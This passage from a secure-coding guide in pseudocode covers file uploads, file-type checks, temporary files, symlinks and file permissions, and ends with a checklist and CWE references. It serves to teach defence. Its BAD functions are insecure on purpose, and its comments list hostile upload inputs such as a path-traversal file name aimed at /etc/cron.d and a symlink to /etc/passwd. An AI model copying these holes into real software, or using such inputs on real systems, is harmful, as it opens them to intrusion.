// - Upload shell.php -> execute PHP code
// - Upload malicious.html -> stored XSS
// - Upload ../../../etc/cron.d/malicious -> write to system dirs
// - Upload huge file -> disk exhaustion DoS
// - Upload polyglot (valid image + embedded JS) -> bypass checks

// ========================================
// GOOD: Comprehensive upload validation
// ========================================
CONSTANT ALLOWED_EXTENSIONS = {"jpg", "jpeg", "png", "gif", "pdf", "doc", "docx"}
CONSTANT ALLOWED_MIME_TYPES = {
    "image/jpeg", "image/png", "image/gif",
    "application/pdf",
    "application/msword",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
}
CONSTANT MAX_FILE_SIZE = 10 * 1024 * 1024  // 10 MB
CONSTANT UPLOAD_DIR = "/var/app/uploads"

@route("/api/upload")
FUNCTION upload_file_secure(request):
    uploaded_file = request.files.get("file")

    IF uploaded_file IS NULL:
        RETURN error_response(400, "No file provided")
    END IF

    // Step 1: Check file size BEFORE reading into memory
    content_length = request.headers.get("Content-Length")
    IF content_length IS NOT NULL AND int(content_length) > MAX_FILE_SIZE:
        RETURN error_response(413, "File too large")
    END IF

    // Step 2: Validate original filename extension
    original_filename = uploaded_file.filename
    extension = get_extension(original_filename).lower()

    IF extension NOT IN ALLOWED_EXTENSIONS:
        log.warning("Rejected upload with extension", {extension: extension})
        RETURN error_response(400, "File type not allowed")
    END IF

    // Step 3: Read file with size limit
    file_content = uploaded_file.read(MAX_FILE_SIZE + 1)

    IF len(file_content) > MAX_FILE_SIZE:
        RETURN error_response(413, "File too large")
    END IF

    // Step 4: Validate MIME type from file content (magic bytes)
    detected_mime = detect_mime_type(file_content)

    IF detected_mime NOT IN ALLOWED_MIME_TYPES:
        log.warning("MIME type mismatch", {
            claimed: uploaded_file.content_type,
            detected: detected_mime
        })
        RETURN error_response(400, "File type not allowed")
    END IF

    // Step 5: For images, verify they parse correctly (anti-polyglot)
    IF detected_mime.starts_with("image/"):
        TRY:
            image = parse_image(file_content)
            // Re-encode to strip any embedded data
            file_content = encode_image(image, format=extension)
        CATCH ImageParseError:
            RETURN error_response(400, "Invalid image file")
        END TRY
    END IF

    // Step 6: Generate random filename (never use user input)
    random_name = generate_uuid() + "." + extension
    save_path = join_path(UPLOAD_DIR, random_name)

    // Step 7: Save with restrictive permissions
    write_file(save_path, file_content, permissions=0o644)

    // Step 8: Store metadata in database
    file_id = database.insert("files", {
        id: generate_uuid(),
        storage_name: random_name,
        original_name: sanitize_filename(original_filename),
        mime_type: detected_mime,
        size: len(file_content),
        owner_id: current_user.id,
        uploaded_at: current_timestamp()
    })

    log.info("File uploaded", {file_id: file_id, size: len(file_content)})

    RETURN {
        file_id: file_id,
        // Serve through controlled endpoint, not direct file access
        url: "/api/files/" + file_id
    }
END FUNCTION

// Serve uploaded files safely
@route("/api/files/{file_id}")
FUNCTION serve_file_secure(request, file_id):
    file_record = database.get_file(file_id)

    IF file_record IS NULL OR file_record.owner_id != current_user.id:
        RETURN error_response(404, "File not found")
    END IF

    file_path = join_path(UPLOAD_DIR, file_record.storage_name)
    content = read_file(file_path)

    RETURN response(200, content, headers={
        // Force download for non-image types
        "Content-Disposition": "attachment; filename=\"" +
                              sanitize_header(file_record.original_name) + "\"",
        // Prevent MIME sniffing
        "X-Content-Type-Options": "nosniff",
        // Strict content type
        "Content-Type": file_record.mime_type
    })
END FUNCTION
```

### 10.3 Missing File Type Validation

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Extension-only or no validation
// ========================================
FUNCTION validate_image_bad(filename, file_content):
    // VULNERABLE: Only checks extension, easily spoofed
    extension = get_extension(filename).lower()

    IF extension IN ["jpg", "jpeg", "png", "gif"]:
        RETURN TRUE  // Attacker renames malware.exe to malware.jpg
    END IF

    RETURN FALSE
END FUNCTION

FUNCTION validate_mime_header_bad(file_content):
    // VULNERABLE: Only checks claimed MIME type header
    mime = request.headers.get("Content-Type")

    IF mime.starts_with("image/"):
        RETURN TRUE  // Attacker sets Content-Type: image/png for shell.php
    END IF

    RETURN FALSE
END FUNCTION

// ========================================
// GOOD: Multi-layer file type validation
// ========================================

// Magic bytes signatures for common file types
MAGIC_SIGNATURES = {
    "jpg": [0xFF, 0xD8, 0xFF],
    "png": [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A],
    "gif": [0x47, 0x49, 0x46, 0x38],  // GIF8
    "pdf": [0x25, 0x50, 0x44, 0x46],  // %PDF
    "zip": [0x50, 0x4B, 0x03, 0x04],
    "docx": [0x50, 0x4B, 0x03, 0x04],  // DOCX is ZIP-based
}

FUNCTION validate_file_type(filename, file_content, allowed_types):
    // Layer 1: Extension validation
    extension = get_extension(filename).lower()

    IF extension NOT IN allowed_types:
        RETURN {valid: FALSE, reason: "Extension not allowed"}
    END IF

    // Layer 2: Magic bytes validation
    detected_type = detect_type_by_magic(file_content)

    IF detected_type IS NULL:
        RETURN {valid: FALSE, reason: "Unknown file type"}
    END IF

    IF detected_type NOT IN allowed_types:
        RETURN {valid: FALSE, reason: "Content type not allowed"}
    END IF

    // Layer 3: Extension matches content
    IF NOT extension_matches_content(extension, detected_type):
        RETURN {valid: FALSE, reason: "Extension does not match content"}
    END IF

    // Layer 4: For specific types, deep validation
    IF detected_type IN ["jpg", "jpeg", "png", "gif"]:
        IF NOT validate_image_structure(file_content):
            RETURN {valid: FALSE, reason: "Invalid image structure"}
        END IF
    ELSE IF detected_type == "pdf":
        IF NOT validate_pdf_safe(file_content):
            RETURN {valid: FALSE, reason: "PDF contains unsafe content"}
        END IF
    ELSE IF detected_type IN ["docx", "xlsx"]:
        IF NOT validate_office_safe(file_content):
            RETURN {valid: FALSE, reason: "Document contains macros"}
        END IF
    END IF

    RETURN {valid: TRUE, detected_type: detected_type}
END FUNCTION

FUNCTION detect_type_by_magic(file_content):
    IF len(file_content) < 8:
        RETURN NULL
    END IF

    header = file_content[0:8]

    FOR type_name, signature IN MAGIC_SIGNATURES:
        IF header.starts_with(bytes(signature)):
            RETURN type_name
        END IF
    END FOR

    RETURN NULL
END FUNCTION

FUNCTION validate_image_structure(file_content):
    TRY:
        // Use secure image library to parse
        image = image_library.decode(file_content)

        // Check for reasonable dimensions (anti-DoS)
        IF image.width > 10000 OR image.height > 10000:
            RETURN FALSE
        END IF

        // Check pixel count (decompression bomb protection)
        IF image.width * image.height > 100000000:  // 100 megapixels
            RETURN FALSE
        END IF

        RETURN TRUE

    CATCH ImageDecodeError:
        RETURN FALSE
    END TRY
END FUNCTION

FUNCTION validate_pdf_safe(file_content):
    TRY:
        pdf = pdf_library.parse(file_content)

        // Check for JavaScript (often used in attacks)
        IF pdf.contains_javascript():
            RETURN FALSE
        END IF

        // Check for embedded files
        IF pdf.has_embedded_files():
            RETURN FALSE
        END IF

        // Check for form actions pointing to URLs
        IF pdf.has_external_actions():
            RETURN FALSE
        END IF

        RETURN TRUE

    CATCH PDFParseError:
        RETURN FALSE
    END TRY
END FUNCTION

FUNCTION validate_office_safe(file_content):
    TRY:
        // Office files are ZIP archives
        archive = zip_library.open(file_content)

        // Check for macro-enabled formats
        FOR entry IN archive.entries():
            IF entry.name.contains("vbaProject") OR entry.name.ends_with(".bin"):
                RETURN FALSE  // Contains macros
            END IF
        END FOR

        RETURN TRUE

    CATCH ZipError:
        RETURN FALSE
    END TRY
END FUNCTION
```

### 10.4 Insecure Temporary File Handling

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Predictable or insecure temp files
// ========================================

// Mistake 1: Predictable filename
FUNCTION create_temp_bad_predictable(data):
    // VULNERABLE: Attacker can predict and pre-create file
    temp_path = "/tmp/myapp_" + current_user.id + ".tmp"

    // Race condition: attacker creates symlink before this
    write_file(temp_path, data)

    RETURN temp_path
END FUNCTION

// Mistake 2: World-readable permissions
FUNCTION create_temp_bad_permissions(data):
    temp_path = "/tmp/myapp_" + random_string(8) + ".tmp"

    // VULNERABLE: Default permissions may be world-readable (0644)
    write_file(temp_path, data)  // Other users can read

    RETURN temp_path
END FUNCTION

// Mistake 3: Not cleaning up
FUNCTION process_upload_bad_cleanup(uploaded_data):
    temp_path = "/tmp/upload_" + generate_uuid()
    write_file(temp_path, uploaded_data)

    TRY:
        result = process_file(temp_path)
        // VULNERABLE: Temp file remains on disk if exception occurs elsewhere
        RETURN result
    CATCH Error as e:
        // Temp file leaked!
        THROW e
    END TRY
END FUNCTION

// Mistake 4: Using system temp without isolation
FUNCTION create_temp_bad_shared(data):
    // VULNERABLE: Shared /tmp can be accessed by other users/processes
    temp_path = temp_directory() + "/" + random_string(8)
    write_file(temp_path, data)
    RETURN temp_path
END FUNCTION

// ========================================
// GOOD: Secure temporary file handling
// ========================================

// Use language's secure temp file creation
FUNCTION create_temp_secure(data, suffix=".tmp"):
    // mkstemp equivalent: creates file with random name and 0600 permissions
    temp_file = create_secure_temp_file(
        prefix="myapp_",
        suffix=suffix,
        dir="/var/app/tmp"  // App-specific temp directory
    )

    // Write data to already-open file handle (no race condition)
    temp_file.write(data)
    temp_file.flush()

    RETURN temp_file
END FUNCTION

// Process with guaranteed cleanup
FUNCTION process_upload_secure(uploaded_data):
    temp_file = NULL

    TRY:
        // Create secure temp file
        temp_file = create_secure_temp_file(
            prefix="upload_",
            suffix=get_safe_extension(uploaded_data.filename),
            dir=APPLICATION_TEMP_DIR
        )

        // Write with explicit permissions
        temp_file.write(uploaded_data.content)
        temp_file.flush()

        // Process the file
        result = process_file(temp_file.path)

        RETURN result

    FINALLY:
        // Always clean up, even on exception
        IF temp_file IS NOT NULL:
            TRY:
                temp_file.close()
                delete_file(temp_file.path)
            CATCH:
                log.warning("Failed to clean up temp file", {path: temp_file.path})
            END TRY
        END IF
    END TRY
END FUNCTION

// Context manager pattern for automatic cleanup
FUNCTION with_temp_file(data, callback):
    temp_file = create_secure_temp_file(prefix="ctx_")

    TRY:
        temp_file.write(data)
        temp_file.flush()

        RETURN callback(temp_file.path)

    FINALLY:
        temp_file.close()
        secure_delete(temp_file.path)  // Overwrite before delete for sensitive data
    END TRY
END FUNCTION

// Usage:
result = with_temp_file(sensitive_data, FUNCTION(path):
    RETURN external_processor.process(path)
END FUNCTION)

// Secure temp directory per-request
FUNCTION create_temp_directory_secure():
    // Create directory with random name and 0700 permissions
    temp_dir = create_secure_temp_directory(
        prefix="session_",
        dir=APPLICATION_TEMP_DIR
    )

    // Set restrictive permissions
    set_permissions(temp_dir, 0o700)

    RETURN temp_dir
END FUNCTION

// Application startup: ensure temp directory security
FUNCTION initialize_temp_directory():
    temp_dir = APPLICATION_TEMP_DIR

    // Create if doesn't exist
    IF NOT directory_exists(temp_dir):
        create_directory(temp_dir, permissions=0o700)
    END IF

    // Verify permissions
    current_perms = get_permissions(temp_dir)
    IF current_perms != 0o700:
        set_permissions(temp_dir, 0o700)
    END IF

    // Verify ownership
    IF get_owner(temp_dir) != get_current_user():
        THROW SecurityError("Temp directory has incorrect ownership")
    END IF

    // Clean up old temp files on startup
    cleanup_old_temp_files(temp_dir, max_age_hours=24)
END FUNCTION

// Secure delete for sensitive data
FUNCTION secure_delete(file_path):
    IF file_exists(file_path):
        // Overwrite with random data before deletion
        file_size = get_file_size(file_path)
        random_data = crypto.random_bytes(file_size)
        write_file(file_path, random_data)
        sync_to_disk(file_path)

        // Now delete
        delete_file(file_path)
    END IF
END FUNCTION
```

### 10.5 Symlink Vulnerabilities

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Following symlinks without validation
// ========================================
FUNCTION read_user_file_vulnerable(user_id, filename):
    user_dir = "/var/app/users/" + user_id
    file_path = user_dir + "/" + filename

    // VULNERABLE: If filename is symlink to /etc/passwd, reads it
    IF file_exists(file_path):
        RETURN read_file(file_path)
    END IF

    RETURN NULL
END FUNCTION

FUNCTION delete_file_vulnerable(user_id, filename):
    user_dir = "/var/app/users/" + user_id
    file_path = user_dir + "/" + filename

    // VULNERABLE: Attacker creates symlink to critical file
    // Symlink: /var/app/users/123/data -> /etc/passwd
    // delete_file follows the symlink and deletes /etc/passwd
    delete_file(file_path)
END FUNCTION

// TOCTOU (Time of Check to Time of Use) vulnerability
FUNCTION process_file_toctou(file_path):
    // Check if file is safe
    IF is_symlink(file_path):
        THROW SecurityError("Symlinks not allowed")
    END IF

    // VULNERABLE: Race condition between check and use
    // Attacker replaces regular file with symlink here

    // Process the file (now following attacker's symlink)
    content = read_file(file_path)
    RETURN process_content(content)
END FUNCTION

// ========================================
// GOOD: Safe symlink handling
// ========================================

// Option 1: Reject symlinks entirely
FUNCTION read_user_file_no_symlinks(user_id, filename):
    user_dir = "/var/app/users/" + user_id

    // Validate filename
    IF NOT is_safe_filename(filename):
        THROW ValidationError("Invalid filename")
    END IF

    file_path = join_path(user_dir, filename)

    // Use lstat to check WITHOUT following symlinks
    file_stat = lstat(file_path)  // NOT stat()

    IF file_stat IS NULL:
        THROW NotFoundError("File not found")
    END IF

    // Reject if symlink
    IF file_stat.is_symlink:
        log.security("Symlink access blocked", {path: file_path})
        THROW SecurityError("Access denied")
    END IF

    // Reject if not regular file
    IF NOT file_stat.is_regular_file:
        THROW ValidationError("Not a regular file")
    END IF

    // Use O_NOFOLLOW flag when opening
    file_handle = open_file(file_path, flags=O_RDONLY | O_NOFOLLOW)
    content = file_handle.read()
    file_handle.close()

    RETURN content
END FUNCTION

// Option 2: Resolve and validate path before access
FUNCTION read_file_resolved(base_dir, relative_path):
    // Get the real path resolving all symlinks
    requested_path = join_path(base_dir, relative_path)
    real_path = realpath(requested_path)

    // Verify real path is within allowed base directory
    real_base = realpath(base_dir)

    IF NOT real_path.starts_with(real_base + "/"):
        log.security("Path escape via symlink", {
            requested: requested_path,
            resolved: real_path,
            base: real_base
        })
        THROW SecurityError("Access denied")
    END IF

    RETURN read_file(real_path)
END FUNCTION

// Option 3: Atomic operations to prevent TOCTOU
FUNCTION process_file_atomic(file_path):
    // Open with O_NOFOLLOW - fails if symlink
    TRY:
        file_handle = open_file(file_path, flags=O_RDONLY | O_NOFOLLOW)
    CATCH SymlinkError:
        THROW SecurityError("Symlinks not allowed")
    END TRY

    // fstat the open handle, not the path (prevents TOCTOU)
    file_stat = fstat(file_handle)

    // Verify it's still a regular file
    IF NOT file_stat.is_regular_file:
        file_handle.close()
        THROW ValidationError("Not a regular file")
    END IF

    // Read from the verified handle
    content = file_handle.read()
    file_handle.close()

    RETURN process_content(content)
END FUNCTION

// Safe file writing with symlink protection
FUNCTION write_file_safe(directory, filename, content):
    // Validate filename
    IF NOT is_safe_filename(filename):
        THROW ValidationError("Invalid filename")
    END IF

    file_path = join_path(directory, filename)

    // Check if path already exists
    existing_stat = lstat(file_path)

    IF existing_stat IS NOT NULL:
        IF existing_stat.is_symlink:
            THROW SecurityError("Cannot overwrite symlink")
        END IF
    END IF

    // Open with O_CREAT | O_EXCL to fail if exists (then retry with O_TRUNC)
    // Or use O_NOFOLLOW if supported for writing
    TRY:
        // Write to temp file first, then atomic rename
        temp_path = join_path(directory, "." + generate_uuid() + ".tmp")

        file_handle = open_file(temp_path,
            flags=O_WRONLY | O_CREAT | O_EXCL,
            permissions=0o644
        )
        file_handle.write(content)
        file_handle.flush()
        file_handle.close()

        // Atomic rename (on same filesystem)
        rename_file(temp_path, file_path)

    CATCH FileExistsError:
        // Handle race condition
        THROW ConcurrencyError("File creation conflict")
    END TRY
END FUNCTION

// Directory traversal with symlink safety
FUNCTION list_directory_safe(dir_path):
    real_dir = realpath(dir_path)
    entries = []

    FOR entry IN list_directory(real_dir):
        entry_path = join_path(real_dir, entry.name)
        entry_stat = lstat(entry_path)  // Don't follow symlinks

        entry_info = {
            name: entry.name,
            is_file: entry_stat.is_regular_file,
            is_dir: entry_stat.is_directory,
            is_symlink: entry_stat.is_symlink,
            size: entry_stat.size IF entry_stat.is_regular_file ELSE 0
        }

        // Optionally resolve symlink target for display
        IF entry_stat.is_symlink:
            entry_info.symlink_target = readlink(entry_path)
            // Check if symlink points outside directory
            real_target = realpath(entry_path)
            entry_info.safe = real_target.starts_with(real_dir + "/")
        END IF

        entries.append(entry_info)
    END FOR

    RETURN entries
END FUNCTION
```

### 10.6 Unsafe File Permissions

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Overly permissive file permissions
// ========================================

// Mistake 1: World-readable sensitive files
FUNCTION save_config_bad(config_data):
    // VULNERABLE: Default umask may create 0644 (world-readable)
    write_file("/etc/myapp/config.json", json_encode(config_data))
    // Config contains database passwords, API keys, etc.
END FUNCTION

// Mistake 2: World-writable files
FUNCTION create_log_bad():
    log_path = "/var/log/myapp/app.log"

    // VULNERABLE: 0666 allows any user to modify logs
    write_file(log_path, "", permissions=0o666)
END FUNCTION

// Mistake 3: Executable when shouldn't be
FUNCTION save_upload_bad(content, filename):
    path = "/var/app/uploads/" + filename

    // VULNERABLE: 0755 makes file executable
    write_file(path, content, permissions=0o755)
    // Attacker uploads shell script and executes it
END FUNCTION

// Mistake 4: Directory permissions too open
FUNCTION create_user_dir_bad(user_id):
    dir_path = "/var/app/users/" + user_id

    // VULNERABLE: 0777 allows anyone to read/write/traverse
    create_directory(dir_path, permissions=0o777)
END FUNCTION

// Mistake 5: Not checking permissions on read
FUNCTION load_config_bad():
    config_path = "/etc/myapp/secrets.json"

    // VULNERABLE: Loads config without verifying it hasn't been tampered
    RETURN json_decode(read_file(config_path))
END FUNCTION

// ========================================
// GOOD: Secure file permissions
// ========================================

// Permission constants
CONSTANT PERM_OWNER_ONLY = 0o600        // -rw-------
CONSTANT PERM_OWNER_READ_ONLY = 0o400   // -r--------
CONSTANT PERM_STANDARD_FILE = 0o644     // -rw-r--r--
CONSTANT PERM_PRIVATE_DIR = 0o700       // drwx------
CONSTANT PERM_STANDARD_DIR = 0o755      // drwxr-xr-x

FUNCTION save_sensitive_config(config_data):
    config_path = "/etc/myapp/secrets.json"

    // Set restrictive umask for this operation
    old_umask = set_umask(0o077)

    TRY:
        // Write to temp file first
        temp_path = config_path + ".tmp"
        write_file(temp_path, json_encode(config_data))

        // Explicitly set permissions (don't rely on umask)
        set_permissions(temp_path, PERM_OWNER_ONLY)

        // Set ownership to service account
        set_owner(temp_path, "myapp", "myapp")

        // Atomic rename
        rename_file(temp_path, config_path)

    FINALLY:
        // Restore umask
        set_umask(old_umask)
    END TRY
END FUNCTION

FUNCTION create_log_secure():
    log_dir = "/var/log/myapp"
    log_path = log_dir + "/app.log"

    // Ensure directory exists with correct permissions
    IF NOT directory_exists(log_dir):
        create_directory(log_dir, permissions=PERM_STANDARD_DIR)
        set_owner(log_dir, "myapp", "myapp")
    END IF

    // Create log file with appropriate permissions
    // 0640 = owner read/write, group read, others none
    IF NOT file_exists(log_path):
        write_file(log_path, "", permissions=0o640)
        set_owner(log_path, "myapp", "adm")  // adm group can read logs
    END IF
END FUNCTION

FUNCTION save_upload_secure(content, filename, user_id):
    uploads_dir = "/var/app/uploads"
    user_dir = join_path(uploads_dir, user_id)

    // Ensure user directory exists
    IF NOT directory_exists(user_dir):
        create_directory(user_dir, permissions=PERM_PRIVATE_DIR)
    END IF

    // Generate safe filename
    safe_name = generate_uuid() + get_safe_extension(filename)
    file_path = join_path(user_dir, safe_name)

    // Save with NO execute permission, owner read/write only
    write_file(file_path, content, permissions=PERM_OWNER_ONLY)

    RETURN file_path
END FUNCTION

FUNCTION load_config_secure(config_path):
    // Verify file exists
    IF NOT file_exists(config_path):
        THROW ConfigError("Config file not found")
    END IF

    // Check permissions before loading
    file_stat = stat(config_path)

    // Reject if world-readable or world-writable
    IF file_stat.mode & 0o004:  // World readable
        THROW SecurityError("Config file is world-readable")
    END IF

    IF file_stat.mode & 0o002:  // World writable
        THROW SecurityError("Config file is world-writable")
    END IF

    // Verify ownership
    expected_owner = get_service_user()
    IF file_stat.owner != expected_owner:
        THROW SecurityError("Config file has incorrect ownership")
    END IF

    // Safe to load
    RETURN json_decode(read_file(config_path))
END FUNCTION

// Verify and fix permissions on startup
FUNCTION verify_file_permissions():
    critical_files = [
        {path: "/etc/myapp/secrets.json", expected: 0o600, type: "file"},
        {path: "/etc/myapp", expected: 0o700, type: "directory"},
        {path: "/var/app/private", expected: 0o700, type: "directory"},
        {path: "/var/app/uploads", expected: 0o755, type: "directory"}
    ]

    FOR item IN critical_files:
        IF NOT exists(item.path):
            log.warning("Missing path", {path: item.path})
            CONTINUE
        END IF

        current_stat = stat(item.path)
        current_mode = current_stat.mode & 0o777  // Permission bits only

        IF current_mode != item.expected:
            log.warning("Fixing permissions", {
                path: item.path,
                current: format_octal(current_mode),
                expected: format_octal(item.expected)
            })
            set_permissions(item.path, item.expected)
        END IF

        // Check for world-writable
        IF current_mode & 0o002:
            log.error("World-writable file detected", {path: item.path})
            THROW SecurityError("Critical file is world-writable: " + item.path)
        END IF
    END FOR

    log.info("File permissions verified")
END FUNCTION

// Secure file copy
FUNCTION copy_file_secure(source, destination, preserve_permissions=FALSE):
    // Read source
    source_stat = stat(source)

    IF source_stat.is_symlink:
        THROW SecurityError("Cannot copy symlinks")
    END IF

    content = read_file(source)

    // Determine permissions for destination
    IF preserve_permissions:
        dest_perms = source_stat.mode & 0o777
        // But never preserve world-writable
        dest_perms = dest_perms & ~0o002
    ELSE:
        // Default to secure permissions
        dest_perms = PERM_OWNER_ONLY
    END IF

    // Write with explicit permissions
    write_file(destination, content, permissions=dest_perms)
END FUNCTION
```

---

## Pre-Generation Security Checklist

**Before generating ANY code, verify these critical security requirements:**

### ✓ Secrets & Credentials
- [ ] No hardcoded API keys, passwords, tokens, or secrets
- [ ] Credentials loaded from environment variables or secret managers
- [ ] No secrets in client-side/frontend code
- [ ] Git history checked for accidentally committed secrets

### ✓ Input Handling
- [ ] All user input validated on the SERVER side
- [ ] Input type, length, and format constraints enforced
- [ ] Database queries use parameterized/prepared statements
- [ ] Shell commands use argument arrays, not string concatenation
- [ ] File paths validated and canonicalized before use

### ✓ Output Encoding
- [ ] HTML output properly encoded to prevent XSS
- [ ] Context-appropriate encoding (HTML, URL, JS, CSS)
- [ ] Content-Security-Policy header configured
- [ ] Error messages don't expose internal details

### ✓ Authentication & Sessions
- [ ] Passwords hashed with bcrypt/Argon2 (not MD5/SHA1)
- [ ] Session tokens generated with cryptographically secure randomness
- [ ] Session IDs regenerated on authentication state changes
- [ ] Rate limiting on authentication endpoints
- [ ] JWT tokens use strong secrets and explicit algorithms

### ✓ Cryptography
- [ ] Modern algorithms only (AES-GCM, ChaCha20-Poly1305)
- [ ] Keys from environment/secret manager, not hardcoded
- [ ] Unique IVs/nonces for each encryption operation
- [ ] Key derivation uses PBKDF2/Argon2/scrypt

### ✓ File Operations
- [ ] File uploads validate extension, MIME type, and magic bytes
- [ ] File size limits enforced
- [ ] Uploaded files stored outside web root
- [ ] Path traversal prevented with basename + realpath validation
- [ ] Temp files use mkstemp with restrictive permissions

### ✓ API Security
- [ ] All endpoints require authentication (unless explicitly public)
- [ ] Object-level authorization verified (ownership checks)
- [ ] Response DTOs with explicit field allowlists
- [ ] Rate limiting applied to prevent abuse
- [ ] Error responses use standard format without internal details

### ✓ Dependencies
- [ ] Package names verified to exist before importing
- [ ] Dependencies pinned to exact versions with lockfiles
- [ ] No packages with known vulnerabilities
- [ ] Transitive dependencies reviewed

### ✓ Configuration
- [ ] Debug mode disabled in production
- [ ] Default credentials replaced with strong values
- [ ] Security headers configured (CSP, HSTS, X-Frame-Options)
- [ ] CORS restricted to known origins
- [ ] Admin interfaces protected with additional authentication

---

## External References

### OWASP Resources
- **OWASP Top 10 (2021):** https://owasp.org/Top10/
- **OWASP ASVS:** https://owasp.org/www-project-application-security-verification-standard/
- **OWASP Cheat Sheet Series:** https://cheatsheetseries.owasp.org/
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/

### CWE (Common Weakness Enumeration)
- **CWE Database:** https://cwe.mitre.org/
- **CWE Top 25 (2024):** https://cwe.mitre.org/top25/archive/2024/2024_cwe_top25.html

### CWE References in This Document
| CWE ID | Name | Sections |
|--------|------|----------|
| CWE-16 | Configuration | 7.5 |
| CWE-20 | Improper Input Validation | 6.1-6.6 |
| CWE-22 | Path Traversal | 6.6, 10.1 |
| CWE-59 | Symlink Following | 10.5 |
| CWE-78 | OS Command Injection | 2.2 |
| CWE-79 | Cross-site Scripting (XSS) | 3.1-3.5 |
| CWE-80 | Basic XSS | 3.1-3.5 |
| CWE-89 | SQL Injection | 2.1 |
| CWE-90 | LDAP Injection | 2.3 |
| CWE-117 | Log Injection | Quick Reference |
| CWE-180 | Incorrect Canonicalization | 6.6 |
| CWE-200 | Information Exposure | 9.4 |
| CWE-209 | Error Message Information Exposure | 7.2, 9.6 |
| CWE-215 | Information Exposure Through Debug | 7.1 |
| CWE-259 | Hard-coded Password | 1.1-1.5 |
| CWE-284 | Improper Access Control | 9.1 |
| CWE-287 | Improper Authentication | 4.1-4.7, 9.1 |
| CWE-307 | Brute Force | 4.2 |
| CWE-326 | Inadequate Encryption Strength | 5.1 |
| CWE-327 | Use of Broken Crypto Algorithm | 5.1 |
| CWE-328 | Weak Hash | 5.1 |
| CWE-330 | Insufficient Randomness | 5.6 |
| CWE-346 | Origin Validation Error (CORS) | 7.4 |
| CWE-377 | Insecure Temporary File | 10.4 |
| CWE-384 | Session Fixation | 4.4 |
| CWE-434 | Unrestricted File Upload | 10.2 |
| CWE-494 | Download Without Integrity Check | 8.5 |
| CWE-521 | Weak Password Requirements | 4.1 |
| CWE-613 | Insufficient Session Expiration | 4.4 |
| CWE-639 | Insecure Direct Object Reference | 9.2 |
| CWE-643 | XPath Injection | 2.4 |
| CWE-732 | Incorrect Permission Assignment | 10.6 |
| CWE-759 | Use of One-Way Hash without Salt | 5.7 |
| CWE-770 | Resource Exhaustion (Rate Limiting) | 9.5 |
| CWE-798 | Hard-coded Credentials | 1.1-1.5 |
| CWE-829 | Inclusion of Untrusted Functionality | 8.4 |
| CWE-915 | Mass Assignment | 9.3 |
| CWE-943 | NoSQL Injection | 2.5 |
| CWE-1104 | Use of Unmaintained Components | 8.1 |
| CWE-1284 | Improper Validation of Array Index | 6.3 |
| CWE-1333 | ReDoS | 6.4 |
| CWE-1336 | Template Injection | 2.6 |
| CWE-1357 | Reliance on Insufficiently Trustworthy Component | 8.1-8.6 |

### Additional Security Resources
- **NIST NVD:** https://nvd.nist.gov/
- **Snyk Vulnerability Database:** https://snyk.io/vuln/
- **GitHub Advisory Database:** https://github.com/advisories
- **MITRE ATT&CK:** https://attack.mitre.org/

---

## Document Metadata

| Field | Value |
|-------|-------|
| **Version** | 1.0.0 |
| **Created** | 2026-01-18 |
| **Last Updated** | 2026-01-18 |
| **Coverage** | 10 security domains, 50+ anti-patterns |
| **Format** | Language-agnostic pseudocode |
| **License** | MIT |

### Version History
| Version | Date | Changes |
|---------|------|---------|
| 1.0.0 | 2026-01-18 | Initial comprehensive release covering all 10 security domains |

### Contributing
This document is designed to be extended. When adding new anti-patterns:
1. Follow the BAD/GOOD pseudocode format
2. Include CWE references where applicable
3. Add entries to the Quick Reference Table
4. Update the Pre-Generation Checklist if needed

---

## Summary

This document provides comprehensive security anti-pattern guidance across 10 critical domains:

1. **Secrets and Credentials Management** - Preventing credential exposure
2. **Injection Vulnerabilities** - SQL, Command, LDAP, XPath, NoSQL, Template
3. **Cross-Site Scripting (XSS)** - Reflected, Stored, DOM-based
4. **Authentication and Session Management** - Passwords, sessions, JWT, MFA
5. **Cryptographic Failures** - Algorithms, keys, randomness
6. **Input Validation** - Type checking, length limits, ReDoS
7. **Configuration and Deployment** - Debug mode, headers, CORS
8. **Dependency and Supply Chain** - Packages, typosquatting, integrity
9. **API Security** - Auth, IDOR, rate limiting, data exposure
10. **File Handling** - Uploads, path traversal, permissions

**Key Statistics from AI Code Security Research:**
- AI-generated code has an **86% XSS failure rate**
- **5-21% of AI-suggested packages don't exist** (slopsquatting)
- AI code is **2.74x more likely** to have XSS vulnerabilities
- **21.7% hallucination rate** for package names in some domains

**Remember:** Security is not optional. Every line of generated code should follow these secure patterns by default.

---

*Generated for use as an LLM system prompt, RAG context, or security reference document.*
*Compatible with any language - implement pseudocode patterns in your target framework.*

